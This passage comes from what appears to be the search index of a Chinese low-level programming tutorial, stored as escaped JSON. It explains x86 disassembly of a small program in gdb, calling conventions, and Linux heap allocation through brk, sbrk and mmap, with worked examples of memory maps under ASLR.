disassemble main Dump of assembler code for function main: 0x00000563 <+0>: lea ecx,[esp+0x4] ;\u5c06 esp+0x4 \u7684\u5730\u5740\u4f20\u7ed9 ecx 0x00000567 <+4>: and esp,0xfffffff0 ;\u6808 16 \u5b57\u8282\u5bf9\u9f50 0x0000056a <+7>: push DWORD PTR [ecx-0x4] ;ecx-0x4\uff0c\u5373\u539f esp \u5f3a\u5236\u8f6c\u6362\u4e3a\u53cc\u5b57\u6570\u636e\u540e\u538b\u5165\u6808\u4e2d 0x0000056d <+10>: push ebp ;\u4fdd\u5b58\u8c03\u7528 main() \u51fd\u6570\u4e4b\u524d\u7684 ebp\uff0c\u7531\u4e8e\u5728 _start \u4e2d\u5c06 ebp \u6e05\u96f6\u4e86\uff0c\u8fd9\u91cc\u7684 ebp=0x0 0x0000056e <+11>: mov ebp,esp ;\u628a\u8c03\u7528 main() \u4e4b\u524d\u7684 esp \u4f5c\u4e3a\u5f53\u524d\u6808\u5e27\u7684 ebp 0x00000570 <+13>: push ebx ;ebx\u3001ecx \u5165\u6808 0x00000571 <+14>: push ecx 0x00000572 <+15>: sub esp,0x10 ;\u4e3a\u5c40\u90e8\u53d8\u91cf a\u3001b \u5206\u914d\u7a7a\u95f4\u5e76\u505a\u5230 16 \u5b57\u8282\u5bf9\u9f50 0x00000575 <+18>: call 0x440 <__x86.get_pc_thunk.bx> ;\u8c03\u7528 <__x86.get_pc_thunk.bx> \u51fd\u6570\uff0c\u5c06 esp \u5f3a\u5236\u8f6c\u6362\u4e3a\u53cc\u5b57\u6570\u636e\u540e\u4fdd\u5b58\u5230 ebx 0x0000057a <+23>: add ebx,0x1a86 ;ebx+0x1a86 0x00000580 <+29>: mov DWORD PTR [ebp-0x10],0x1 ;a \u7b2c\u4e8c\u4e2a\u5165\u6808\u6240\u4ee5\u4fdd\u5b58\u5728 ebp-0x10 \u7684\u4f4d\u7f6e\uff0c\u6b64\u53e5\u5373 a=1 0x00000587 <+36>: mov DWORD PTR [ebp-0xc],0x2 ;b \u7b2c\u4e00\u4e2a\u5165\u6808\u6240\u4ee5\u4fdd\u5b58\u5728 ebp-0xc \u7684\u4f4d\u7f6e\uff0c\u6b64\u53e5\u5373 b=2 0x0000058e <+43>: push DWORD PTR [ebp-0xc] ;\u5c06 b \u538b\u5165\u6808\u4e2d 0x00000591 <+46>: push DWORD PTR [ebp-0x10] ;\u5c06 a \u538b\u5165\u6808\u4e2d 0x00000594 <+49>: call 0x53d <add> ;\u8c03\u7528 add() \u51fd\u6570\uff0c\u8fd4\u56de\u503c\u4fdd\u5b58\u5728 eax \u4e2d 0x00000599 <+54>: add esp,0x8 ;\u6e05\u7406 add() \u7684\u53c2\u6570 0x0000059c <+57>: sub esp,0x8 ;\u8c03\u6574 esp \u4f7f 16 \u4f4d\u5bf9\u9f50 0x0000059f <+60>: push eax ;eax \u5165\u6808 0x000005a0 <+61>: lea eax,[ebx-0x19b0] ;ebx-0x19b0 \u7684\u5730\u5740\u4fdd\u5b58\u5230 eax\uff0c\u8be5\u5730\u5740\u5904\u4fdd\u5b58\u5b57\u7b26\u4e32 \"%d\\n\" 0x000005a6 <+67>: push eax ;eax \u5165\u6808 0x000005a7 <+68>: call 0x3d0 <printf@plt> ;\u8c03\u7528 printf() \u51fd\u6570 0x000005ac <+73>: add esp,0x10 ;\u8c03\u6574\u6808\u9876\u6307\u9488 esp\uff0c\u6e05\u7406 printf() \u7684\u53c2\u6570 0x000005af <+76>: mov eax,0x0 ;eax=0x0 0x000005b4 <+81>: lea esp,[ebp-0x8] ;ebp-0x8 \u7684\u5730\u5740\u4fdd\u5b58\u5230 esp 0x000005b7 <+84>: pop ecx ;\u5f39\u6808\u6062\u590d ecx\u3001ebx\u3001ebp 0x000005b8 <+85>: pop ebx 0x000005b9 <+86>: pop ebp 0x000005ba <+87>: lea esp,[ecx-0x4] ;ecx-0x4 \u7684\u5730\u5740\u4fdd\u5b58\u5230 esp 0x000005bd <+90>: ret ;\u8fd4\u56de\uff0c\u76f8\u5f53\u4e8e pop eip; End of assembler dump. gdb-peda$ disassemble add Dump of assembler code for function add: 0x0000053d <+0>: push ebp ;\u4fdd\u5b58\u8c03\u7528 add() \u51fd\u6570\u4e4b\u524d\u7684 ebp 0x0000053e <+1>: mov ebp,esp ;\u628a\u8c03\u7528 add() \u4e4b\u524d\u7684 esp \u4f5c\u4e3a\u5f53\u524d\u6808\u5e27\u7684 ebp 0x00000540 <+3>: sub esp,0x10 ;\u4e3a\u5c40\u90e8\u53d8\u91cf x\u3001y \u5206\u914d\u7a7a\u95f4\u5e76\u505a\u5230 16 \u5b57\u8282\u5bf9\u9f50 0x00000543 <+6>: call 0x5be <__x86.get_pc_thunk.ax> ;\u8c03\u7528 <__x86.get_pc_thunk.ax> \u51fd\u6570\uff0c\u5c06 esp \u5f3a\u5236\u8f6c\u6362\u4e3a\u53cc\u5b57\u6570\u636e\u540e\u4fdd\u5b58\u5230 eax 0x00000548 <+11>: add eax,0x1ab8 ;eax+0x1ab8 0x0000054d <+16>: mov eax,DWORD PTR [ebp+0x8] ;\u5c06 ebp+0x8 \u7684\u6570\u636e 0x1 \u4f20\u9001\u5230 eax\uff0cebp+0x4 \u4e3a\u51fd\u6570\u8fd4\u56de\u5730\u5740 0x00000550 <+19>: mov DWORD PTR [ebp-0x8],eax ;\u4fdd\u5b58 eax \u7684\u503c 0x1 \u5230 ebp-0x8 \u7684\u4f4d\u7f6e 0x00000553 <+22>: mov eax,DWORD PTR [ebp+0xc] ;\u5c06 ebp+0xc \u7684\u6570\u636e 0x2 \u4f20\u9001\u5230 eax 0x00000556 <+25>: mov DWORD PTR [ebp-0x4],eax ;\u4fdd\u5b58 eax \u7684\u503c 0x2 \u5230 ebp-0x4 \u7684\u4f4d\u7f6e 0x00000559 <+28>: mov edx,DWORD PTR [ebp-0x8] ;\u53d6\u51fa ebp-0x8 \u7684\u503c 0x1 \u5230 edx 0x0000055c <+31>: mov eax,DWORD PTR [ebp-0x4] ;\u53d6\u51fa ebp-0x4 \u7684\u503c 0x2 \u5230 eax 0x0000055f <+34>: add eax,edx ;eax+edx 0x00000561 <+36>: leave ;\u8fd4\u56de\uff0c\u76f8\u5f53\u4e8e mov esp,ebp; pop ebp; 0x00000562 <+37>: ret End of assembler dump. \u8fd9\u91cc\u6211\u4eec\u5728 Linux \u73af\u5883\u4e0b\uff0c\u7531\u4e8e ELF \u6587\u4ef6\u7684\u5165\u53e3\u5176\u5b9e\u662f _start \u800c\u4e0d\u662f main() \uff0c\u6240\u4ee5\u6211\u4eec\u8fd8\u5e94\u8be5\u5173\u6ce8\u4e0b\u9762\u7684\u51fd\u6570\uff1a gdb-peda$ disassemble _start Dump of assembler code for function _start: 0x00000400 <+0>: xor ebp,ebp ;\u6e05\u96f6 ebp\uff0c\u8868\u793a\u4e0b\u9762\u7684 main() \u51fd\u6570\u6808\u5e27\u4e2d ebp \u4fdd\u5b58\u7684\u4e0a\u4e00\u7ea7 ebp \u4e3a 0x00000000 0x00000402 <+2>: pop esi ;\u5c06 argc \u5b58\u5165 esi 0x00000403 <+3>: mov ecx,esp ;\u5c06\u6808\u9876\u5730\u5740\uff08argv \u548c env \u6570\u7ec4\u7684\u5176\u5b9e\u5730\u5740\uff09\u4f20\u7ed9 ecx 0x00000405 <+5>: and esp,0xfffffff0 ;\u6808 16 \u5b57\u8282\u5bf9\u9f50 0x00000408 <+8>: push eax ;eax\u3001esp\u3001edx \u5165\u6808 0x00000409 <+9>: push esp 0x0000040a <+10>: push edx 0x0000040b <+11>: call 0x432 <_start+50> ;\u5148\u5c06\u4e0b\u4e00\u6761\u6307\u4ee4\u5730\u5740 0x00000410 \u538b\u6808\uff0c\u8bbe\u7f6e esp \u6307\u5411\u5b83\uff0c\u518d\u8c03\u7528 0x00000432 \u5904\u7684\u6307\u4ee4 0x00000410 <+16>: add ebx,0x1bf0 ;ebx+0x1bf0 0x00000416 <+22>: lea eax,[ebx-0x19d0] ;\u53d6 <__libc_csu_fini> \u5730\u5740\u4f20\u7ed9 eax\uff0c\u7136\u540e\u538b\u6808 0x0000041c <+28>: push eax 0x0000041d <+29>: lea eax,[ebx-0x1a30] ;\u53d6 <__libc_csu_init> \u5730\u5740\u4f20\u5165 eax\uff0c\u7136\u540e\u538b\u6808 0x00000423 <+35>: push eax 0x00000424 <+36>: push ecx ;ecx\u3001esi \u5165\u6808\u4fdd\u5b58 0x00000425 <+37>: push esi 0x00000426 <+38>: push DWORD PTR [ebx-0x8] ;\u8c03\u7528 main() \u51fd\u6570\u4e4b\u524d\u4fdd\u5b58\u8fd4\u56de\u5730\u5740\uff0c\u5176\u5b9e\u5c31\u662f\u4fdd\u5b58 main() \u51fd\u6570\u7684\u5165\u53e3\u5730\u5740 0x0000042c <+44>: call 0x3e0 <__libc_start_main@plt> ;call \u6307\u4ee4\u8c03\u7528 __libc_start_main \u51fd\u6570 0x00000431 <+49>: hlt ;hlt \u6307\u4ee4\u4f7f\u7a0b\u5e8f\u505c\u6b62\u8fd0\u884c\uff0c\u5904\u7406\u5668\u8fdb\u5165\u6682\u505c\u72b6\u6001\uff0c\u4e0d\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\uff0c\u4e0d\u5f71\u54cd\u6807\u5fd7\u3002\u5f53 RESET \u7ebf\u4e0a\u6709\u590d\u4f4d\u4fe1\u53f7\u3001CPU \u54cd\u5e94\u975e\u5c4f\u853d\u7ec8\u7aef\u3001CPU \u54cd\u5e94\u53ef\u5c4f\u853d\u7ec8\u7aef 3 \u79cd\u60c5\u51b5\u4e4b\u4e00\u65f6\uff0cCPU \u8131\u79bb\u6682\u505c\u72b6\u6001\uff0c\u6267\u884c\u4e0b\u4e00\u6761\u6307\u4ee4 0x00000432 <+50>: mov ebx,DWORD PTR [esp] ;esp \u5f3a\u5236\u8f6c\u6362\u4e3a\u53cc\u5b57\u6570\u636e\u540e\u4fdd\u5b58\u5230 ebx 0x00000435 <+53>: ret ;\u8fd4\u56de\uff0c\u76f8\u5f53\u4e8e pop eip; 0x00000436 <+54>: xchg ax,ax ;\u4ea4\u6362 ax \u548c ax \u7684\u6570\u636e\uff0c\u76f8\u5f53\u4e8e nop 0x00000438 <+56>: xchg ax,ax 0x0000043a <+58>: xchg ax,ax 0x0000043c <+60>: xchg ax,ax 0x0000043e <+62>: xchg ax,ax End of assembler dump.","title":"\u6808"},{"location":"Tutorial/Material/Reverse/#_40","text":"\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a\u662f\u5bf9\u51fd\u6570\u8c03\u7528\u65f6\u5982\u4f55\u4f20\u9012\u53c2\u6570\u7684\u4e00\u79cd\u7ea6\u5b9a\u3002\u8c03\u7528\u51fd\u6570\u524d\u8981\u5148\u628a\u53c2\u6570\u538b\u5165\u6808\u7136\u540e\u518d\u4f20\u9012\u7ed9\u51fd\u6570\u3002 \u4e00\u4e2a\u8c03\u7528\u7ea6\u5b9a\u5927\u6982\u6709\u5982\u4e0b\u7684\u5185\u5bb9\uff1a \u51fd\u6570\u53c2\u6570\u7684\u4f20\u9012\u987a\u5e8f\u548c\u65b9\u5f0f \u6808\u7684\u7ef4\u62a4\u65b9\u5f0f \u540d\u5b57\u4fee\u9970\u7684\u7b56\u7565 \u4e3b\u8981\u7684\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a\u5982\u4e0b\uff0c\u5176\u4e2d cdecl \u662f C \u8bed\u8a00\u9ed8\u8ba4\u7684\u8c03\u7528\u7ea6\u5b9a\uff1a \u8c03\u7528\u7ea6\u5b9a \u51fa\u6808\u65b9 \u53c2\u6570\u4f20\u9012 \u540d\u5b57\u4fee\u9970 cdecl \u51fd\u6570\u8c03\u7528\u65b9 \u4ece\u53f3\u5230\u5de6\u7684\u987a\u5e8f\u538b\u53c2\u6570\u5165\u6808 \u4e0b\u5212\u7ebf\uff0b\u51fd\u6570\u540d stdcall \u51fd\u6570\u672c\u8eab \u4ece\u53f3\u5230\u5de6\u7684\u987a\u5e8f\u538b\u53c2\u6570\u5165\u6808 \u4e0b\u5212\u7ebf\uff0b\u51fd\u6570\u540d\uff0b@\uff0b\u53c2\u6570\u7684\u5b57\u8282\u6570 fastcall \u51fd\u6570\u672c\u8eab \u90fd\u4e24\u4e2a DWORD\uff084 \u5b57\u8282\uff09\u7c7b\u578b\u6216\u8005\u5360\u66f4\u5c11\u5b57\u8282\u7684\u53c2\u6570\u88ab\u653e\u5165\u5bc4\u5b58\u5668\uff0c\u5176\u4ed6\u5269\u4e0b\u7684\u53c2\u6570\u6309\u4ece\u53f3\u5230\u5de6\u7684\u987a\u5e8f\u538b\u5165\u6808 @\uff0b\u51fd\u6570\u540d\uff0b@\uff0b\u53c2\u6570\u7684\u5b57\u8282\u6570 \u9664\u4e86\u53c2\u6570\u7684\u4f20\u9012\u4e4b\u5916\uff0c\u51fd\u6570\u4e0e\u8c03\u7528\u65b9\u8fd8\u53ef\u4ee5\u901a\u8fc7\u8fd4\u56de\u503c\u8fdb\u884c\u4ea4\u4e92\u3002\u5f53\u8fd4\u56de\u503c\u4e0d\u5927\u4e8e 4 \u5b57\u8282\u65f6\uff0c\u8fd4\u56de\u503c\u5b58\u50a8\u5728 eax \u5bc4\u5b58\u5668\u4e2d\uff0c\u5f53\u8fd4\u56de\u503c\u5728 5~8 \u5b57\u8282\u65f6\uff0c\u91c7\u7528 eax \u548c edx \u7ed3\u5408\u7684\u5f62\u5f0f\u8fd4\u56de\uff0c\u5176\u4e2d eax \u5b58\u50a8\u4f4e 4 \u5b57\u8282\uff0c edx \u5b58\u50a8\u9ad8 4 \u5b57\u8282\u3002","title":"\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a"},{"location":"Tutorial/Material/Reverse/#_41","text":"","title":"\u5806\u4e0e\u5185\u5b58\u7ba1\u7406"},{"location":"Tutorial/Material/Reverse/#_42","text":"\u5806\u662f\u7528\u4e8e\u5b58\u653e\u9664\u4e86\u6808\u91cc\u7684\u4e1c\u897f\u4e4b\u5916\u6240\u6709\u5176\u4ed6\u4e1c\u897f\u7684\u5185\u5b58\u533a\u57df\uff0c\u6709\u52a8\u6001\u5185\u5b58\u5206\u914d\u5668\u8d1f\u8d23\u7ef4\u62a4\u3002\u5206\u914d\u5668\u5c06\u5806\u89c6\u4e3a\u4e00\u7ec4\u4e0d\u540c\u5927\u5c0f\u7684\u5757\uff08block\uff09\u7684\u96c6\u5408\u6765\u7ef4\u62a4\uff0c\u6bcf\u4e2a\u5757\u5c31\u662f\u4e00\u4e2a\u8fde\u7eed\u7684\u865a\u62df\u5185\u5b58\u5668\u7247\uff08chunk\uff09\u3002\u5f53\u4f7f\u7528 malloc() \u548c free() \u65f6\u5c31\u662f\u5728\u64cd\u4f5c\u5806\u4e2d\u7684\u5185\u5b58\u3002\u5bf9\u4e8e\u5806\u6765\u8bf4\uff0c\u91ca\u653e\u5de5\u4f5c\u7531\u7a0b\u5e8f\u5458\u63a7\u5236\uff0c\u5bb9\u6613\u4ea7\u751f\u5185\u5b58\u6cc4\u9732\u3002 \u5806\u662f\u5411\u9ad8\u5730\u5740\u6269\u5c55\u7684\u6570\u636e\u7ed3\u6784\uff0c\u662f\u4e0d\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u3002\u8fd9\u662f\u7531\u4e8e\u7cfb\u7edf\u662f\u7528\u94fe\u8868\u6765\u5b58\u50a8\u7684\u7a7a\u95f2\u5185\u5b58\u5730\u5740\u7684\uff0c\u800c\u94fe\u8868\u7684\u904d\u5386\u65b9\u5411\u662f\u7531\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u3002\u5806\u7684\u5927\u5c0f\u53d7\u9650\u4e8e\u8ba1\u7b97\u673a\u7cfb\u7edf\u4e2d\u6709\u6548\u7684\u865a\u62df\u5185\u5b58\u3002\u7531\u6b64\u53ef\u89c1\uff0c\u5806\u83b7\u5f97\u7684\u7a7a\u95f4\u6bd4\u8f83\u7075\u6d3b\uff0c\u4e5f\u6bd4\u8f83\u5927\u3002 \u5982\u679c\u6bcf\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\u90fd\u76f4\u63a5\u4f7f\u7528\u7cfb\u7edf\u8c03\u7528\uff0c\u4f1a\u4e25\u91cd\u5f71\u54cd\u7a0b\u5e8f\u7684\u6027\u80fd\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd0\u884c\u5e93\u5148\u5411\u64cd\u4f5c\u7cfb\u7edf\u201c\u6279\u53d1\u201d\u4e00\u5757\u8f83\u5927\u7684\u5806\u7a7a\u95f4\uff0c\u7136\u540e\u201c\u96f6\u552e\u201d\u7ed9\u7a0b\u5e8f\u4f7f\u7528\u3002\u5f53\u5168\u90e8\u201c\u552e\u5b8c\u201d\u4e4b\u540e\u6216\u8005\u5269\u4f59\u7a7a\u95f4\u4e0d\u80fd\u6ee1\u8db3\u7a0b\u5e8f\u7684\u9700\u6c42\u65f6\uff0c\u518d\u6839\u636e\u60c5\u51b5\u5411\u64cd\u4f5c\u7cfb\u7edf\u201c\u8fdb\u8d27\u201d\u3002","title":"\u5806"},{"location":"Tutorial/Material/Reverse/#_43","text":"Linux \u63d0\u4f9b\u4e86\u4e24\u79cd\u5806\u7a7a\u95f4\u5206\u914d\u7684\u65b9\u5f0f\uff0c\u4e00\u4e2a\u662f brk() \u7cfb\u7edf\u8c03\u7528\uff0c\u53e6\u4e00\u4e2a\u662f mmap() \u7cfb\u7edf\u8c03\u7528\u3002\u53ef\u4ee5\u4f7f\u7528 man brk \u3001 man mmap \u67e5\u770b\u3002 brk() \u7684\u58f0\u660e\u5982\u4e0b\uff1a #include <unistd.h> int brk(void *addr); void *sbrk(intptr_t increment); \u53c2\u6570 *addr \u662f\u8fdb\u7a0b\u6570\u636e\u6bb5\u7684\u7ed3\u675f\u5730\u5740\uff0c brk() \u901a\u8fc7\u6539\u53d8\u8be5\u5730\u5740\u6765\u6539\u53d8\u6570\u636e\u6bb5\u7684\u5927\u5c0f\uff0c\u5f53\u7ed3\u675f\u5730\u5740\u5411\u9ad8\u5730\u5740\u79fb\u52a8\uff0c\u8fdb\u7a0b\u5185\u5b58\u7a7a\u95f4\u589e\u5927\uff0c\u5f53\u7ed3\u675f\u5730\u5740\u5411\u4f4e\u5730\u5740\u79fb\u52a8\uff0c\u8fdb\u7a0b\u5185\u5b58\u7a7a\u95f4\u51cf\u5c0f\u3002 brk() \u8c03\u7528\u6210\u529f\u65f6\u8fd4\u56de 0\uff0c\u5931\u8d25\u65f6\u8fd4\u56de -1\u3002 sbrk() \u4e0e brk() \u7c7b\u4f3c\uff0c\u4f46\u662f\u53c2\u6570 increment \u8868\u793a\u589e\u91cf\uff0c\u5373\u589e\u52a0\u6216\u51cf\u5c11\u7684\u7a7a\u95f4\u5927\u5c0f\uff0c\u8c03\u7528\u6210\u529f\u65f6\u8fd4\u56de\u589e\u52a0\u540e\u51cf\u5c0f\u524d\u6570\u636e\u6bb5\u7684\u7ed3\u675f\u5730\u5740\uff0c\u5931\u8d25\u65f6\u8fd4\u56de -1\u3002 \u5728\u4e0a\u56fe\u4e2d\u6211\u4eec\u770b\u5230 brk \u6307\u793a\u5806\u7ed3\u675f\u5730\u5740\uff0cstart_brk \u6307\u793a\u5806\u5f00\u59cb\u5730\u5740\u3002BSS segment \u548c heap \u4e4b\u95f4\u6709\u4e00\u6bb5 Random brk offset\uff0c\u8fd9\u662f\u7531\u4e8e ASLR \u7684\u4f5c\u7528\uff0c\u5982\u679c\u5173\u95ed\u4e86 ASLR\uff0c\u5219 Random brk offset \u4e3a 0\uff0c\u5806\u7ed3\u675f\u5730\u5740\u548c\u6570\u636e\u6bb5\u5f00\u59cb\u5730\u5740\u91cd\u5408\u3002 \u4f8b\u5b50\uff1a \u6e90\u7801 #include <stdio.h> #include <unistd.h> void main() { void *curr_brk, *tmp_brk, *pre_brk; printf(\"\u5f53\u524d\u8fdb\u7a0b PID\uff1a%d\\n\", getpid()); tmp_brk = curr_brk = sbrk(0); printf(\"\u521d\u59cb\u5316\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a%p\\n\", curr_brk); getchar(); brk(curr_brk+4096); curr_brk = sbrk(0); printf(\"brk \u4e4b\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a%p\\n\", curr_brk); getchar(); pre_brk = sbrk(4096); curr_brk = sbrk(0); printf(\"sbrk \u8fd4\u56de\u503c\uff08\u5373\u4e4b\u524d\u7684\u7ed3\u675f\u5730\u5740\uff09\uff1a%p\\n\", pre_brk); printf(\"sbrk \u4e4b\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a%p\\n\", curr_brk); getchar(); brk(tmp_brk); curr_brk = sbrk(0); printf(\"\u6062\u590d\u5230\u521d\u59cb\u5316\u65f6\u7684\u7ed3\u675f\u5730\u5740\uff1a%p\\n\", curr_brk); getchar(); } \u5f00\u542f\u4e24\u4e2a\u7ec8\u7aef\uff0c\u4e00\u4e2a\u7528\u4e8e\u6267\u884c\u7a0b\u5e8f\uff0c\u53e6\u4e00\u4e2a\u7528\u4e8e\u89c2\u5bdf\u5185\u5b58\u5730\u5740\u3002\u9996\u5148\u6211\u4eec\u770b\u5173\u95ed\u4e86 ASLR \u7684\u60c5\u51b5\u3002\u7b2c\u4e00\u6b65\u521d\u59cb\u5316\uff1a # echo 0 > /proc/sys/kernel/randomize_va_space $ ./a.out \u5f53\u524d\u8fdb\u7a0b PID\uff1a27759 \u521d\u59cb\u5316\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x56579000 # cat /proc/27759/maps ... 56557000-56558000 rw-p 00001000 08:01 28587506 /home/a.out 56558000-56579000 rw-p 00000000 00:00 0 [heap] ... \u6570\u636e\u6bb5\u7ed3\u675f\u5730\u5740\u548c\u5806\u5f00\u59cb\u5730\u5740\u540c\u4e3a 0x56558000 \uff0c\u5806\u7ed3\u675f\u5730\u5740\u4e3a 0x56579000 \u3002 \u7b2c\u4e8c\u6b65\u4f7f\u7528 brk() \u589e\u52a0\u5806\u7a7a\u95f4\uff1a $ ./a.out \u5f53\u524d\u8fdb\u7a0b PID\uff1a27759 \u521d\u59cb\u5316\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x56579000 brk \u4e4b\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x5657a000 # cat /proc/27759/maps ... 56557000-56558000 rw-p 00001000 08:01 28587506 /home/a.out 56558000-5657a000 rw-p 00000000 00:00 0 [heap] ... \u5806\u5f00\u59cb\u5730\u5740\u4e0d\u53d8\uff0c\u7ed3\u675f\u5730\u5740\u589e\u52a0\u4e3a 0x5657a000 \u3002 \u7b2c\u4e09\u6b65\u4f7f\u7528 sbrk() \u589e\u52a0\u5806\u7a7a\u95f4\uff1a $ ./a.out \u5f53\u524d\u8fdb\u7a0b PID\uff1a27759 \u521d\u59cb\u5316\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x56579000 brk \u4e4b\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x5657a000 sbrk \u8fd4\u56de\u503c\uff08\u5373\u4e4b\u524d\u7684\u7ed3\u675f\u5730\u5740\uff09\uff1a0x5657a000 sbrk \u4e4b\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x5657b000 # cat /proc/27759/maps ... 56557000-56558000 rw-p 00001000 08:01 28587506 /home/a.out 56558000-5657b000 rw-p 00000000 00:00 0 [heap] ... \u7b2c\u56db\u6b65\u51cf\u5c0f\u5806\u7a7a\u95f4\uff1a $ ./a.out \u5f53\u524d\u8fdb\u7a0b PID\uff1a27759 \u521d\u59cb\u5316\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x56579000 brk \u4e4b\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x5657a000 sbrk \u8fd4\u56de\u503c\uff08\u5373\u4e4b\u524d\u7684\u7ed3\u675f\u5730\u5740\uff09\uff1a0x5657a000 sbrk \u4e4b\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x5657b000 \u6062\u590d\u5230\u521d\u59cb\u5316\u65f6\u7684\u7ed3\u675f\u5730\u5740\uff1a0x56579000 # cat /proc/27759/maps ... 56557000-56558000 rw-p 00001000 08:01 28587506 /home/a.out 56558000-56579000 rw-p 00000000 00:00 0 [heap] ... \u518d\u6765\u770b\u4e00\u4e0b\u5f00\u542f\u4e86 ASLR \u7684\u60c5\u51b5\uff1a # echo 2 > /proc/sys/kernel/randomize_va_space $ ./a.out \u5f53\u524d\u8fdb\u7a0b PID\uff1a28025 \u521d\u59cb\u5316\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x578ad000 # cat /proc/28025/maps ... 5663f000-56640000 rw-p 00001000 08:01 28587506 /home/a.out 5788c000-578ad000 rw-p 00000000 00:00 0 [heap] ... \u53ef\u4ee5\u770b\u5230\u8fd9\u65f6\u6570\u636e\u6bb5\u7684\u7ed3\u675f\u5730\u5740 0x56640000 \u4e0d\u7b49\u4e8e\u5806\u7684\u5f00\u59cb\u5730\u5740 0x5788c000 \u3002 mmap() \u7684\u58f0\u660e\u5982\u4e0b\uff1a #include <sys/mman.h> void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off); mmap() \u51fd\u6570\u7528\u4e8e\u521b\u5efa\u65b0\u7684\u865a\u62df\u5185\u5b58\u533a\u57df\uff0c\u5e76\u5c06\u5bf9\u8c61\u6620\u5c04\u5230\u8fd9\u4e9b\u533a\u57df\u4e2d\uff0c\u5f53\u5b83\u4e0d\u5c06\u5730\u5740\u7a7a\u95f4\u6620\u5c04\u5230\u67d0\u4e2a\u6587\u4ef6\u65f6\uff0c\u6211\u4eec\u79f0\u8fd9\u5757\u7a7a\u95f4\u4e3a\u533f\u540d\uff08Anonymous\uff09\u7a7a\u95f4\uff0c\u533f\u540d\u7a7a\u95f4\u53ef\u4ee5\u7528\u6765\u4f5c\u4e3a\u5806\u7a7a\u95f4\u3002 mmap() \u51fd\u6570\u8981\u6c42\u5185\u6838\u521b\u5efa\u4e00\u4e2a\u4ece\u5730\u5740 addr \u5f00\u59cb\u7684\u65b0\u865a\u62df\u5185\u5b58\u533a\u57df\uff0c\u5e76\u5c06\u6587\u4ef6\u63cf\u8ff0\u7b26 fildes \u6307\u5b9a\u7684\u5bf9\u8c61\u7684\u4e00\u4e2a\u8fde\u7eed\u7684\u7247\uff08chunk\uff09\u6620\u5c04\u5230\u8fd9\u4e2a\u65b0\u533a\u57df\u3002\u8fde\u7eed\u7684\u5bf9\u8c61\u7247\u5927\u5c0f\u4e3a len \u5b57\u8282\uff0c\u4ece\u8ddd\u6587\u4ef6\u5f00\u59cb\u5904\u504f\u79fb\u91cf\u4e3a off \u5b57\u8282\u7684\u5730\u65b9\u5f00\u59cb\u3002 prot \u63cf\u8ff0\u865a\u62df\u5185\u5b58\u533a\u57df\u7684\u8bbf\u95ee\u6743\u9650\u4f4d\uff0c flags \u63cf\u8ff0\u88ab\u6620\u5c04\u5bf9\u8c61\u7c7b\u578b\u7684\u4f4d\u7ec4\u6210\u3002 munmap() \u5219\u7528\u4e8e\u5220\u9664\u865a\u62df\u5185\u5b58\u533a\u57df\uff1a #include <sys/mman.h> int munmap(void *addr, size_t len); \u4f8b\u5b50\uff1a \u6e90\u7801 #include <stdio.h> #include <sys/mman.h> #include <unistd.h> void main() { void *curr_brk; printf(\"\u5f53\u524d\u8fdb\u7a0b PID\uff1a%d\\n\", getpid()); printf(\"\u521d\u59cb\u5316\u540e\\n\"); getchar(); char *addr; addr = mmap(NULL, (size_t)4096, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0); printf(\"mmap \u5b8c\u6210\\n\"); getchar(); munmap(addr, (size_t)4096); printf(\"munmap \u5b8c\u6210\\n\"); getchar(); } \u7b2c\u4e00\u6b65\u521d\u59cb\u5316\uff1a $ ./a.out \u5f53\u524d\u8fdb\u7a0b PID\uff1a28652 \u521d\u59cb\u5316\u540e # cat /proc/28652/maps ... f76b2000-f76b5000 rw-p 00000000 00:00 0 f76ef000-f76f1000 rw-p 00000000 00:00 0 ... \u7b2c\u4e8c\u6b65 mmap\uff1a ]$ ./a.out \u5f53\u524d\u8fdb\u7a0b PID\uff1a28652 \u521d\u59cb\u5316\u540e mmap \u5b8c\u6210 # cat /proc/28652/maps ... f76b2000-f76b5000 rw-p 00000000 00:00 0 f76ee000-f76f1000 rw-p 00000000 00:00 0 ... \u7b2c\u4e09\u6b65 munmap\uff1a $ ./a.out \u5f53\u524d\u8fdb\u7a0b PID\uff1a28652 \u521d\u59cb\u5316\u540e mmap \u5b8c\u6210 munmap \u5b8c\u6210 # cat /proc/28652/maps ... f76b2000-f76b5000 rw-p 00000000 00:00 0 f76ef000-f76f1000 rw-p 00000000 00:00 0 ... \u53ef\u4ee5\u770b\u5230\u7b2c\u4e8c\u884c\u7b2c\u4e00\u5217\u5730\u5740\u4ece f76ef000 -> f76ee000 -> f76ef000 \u53d8\u5316\u3002 0xf76ee000-0xf76ef000=0x1000=4096 \u3002 \u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4e0d\u4f1a\u76f4\u63a5\u4f7f\u7528 brk() \u548c mmap() \u6765\u5206\u914d\u5806\u7a7a\u95f4\uff0cC \u6807\u51c6\u5e93\u63d0\u4f9b\u4e86\u4e00\u4e2a\u53eb\u505a malloc \u7684\u5206\u914d\u5668\uff0c\u7a0b\u5e8f\u901a\u8fc7\u8c03\u7528 malloc() \u51fd\u6570\u6765\u4ece\u5806\u4e2d\u5206\u914d\u5757\uff0c\u58f0\u660e\u5982\u4e0b\uff1a #include <stdlib.h> void *malloc(size_t size); void free(void *ptr); void *calloc(size_t nmemb, size_t 